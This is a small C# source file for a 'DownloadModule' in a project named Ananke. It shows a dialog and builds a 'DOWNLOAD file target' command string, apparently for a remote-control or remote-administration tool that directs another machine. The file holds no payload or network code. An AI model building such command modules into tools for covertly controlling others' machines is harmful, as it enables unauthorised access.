using System;
using System.Windows.Forms;
using Ananke.Forms;

namespace Ananke.Modules {
    public class DownloadModule : IControlModule {
        public string Identifier => "DOWNLOAD";

        public string Activate() {
            DownloadForm form = new DownloadForm();
            if(form.ShowDialog() == DialogResult.OK) {
                if(String.IsNullOrEmpty(form.Target)) {
                    return String.Format("{0} {1}", Identifier, form.File);
                }

                return String.Format("{0} {1} {2}", Identifier, form.File, form.Target.Replace(" ", "%20"));
            }

            return null;
        }

        public void ResponseReceived(string response) {}
    }
}
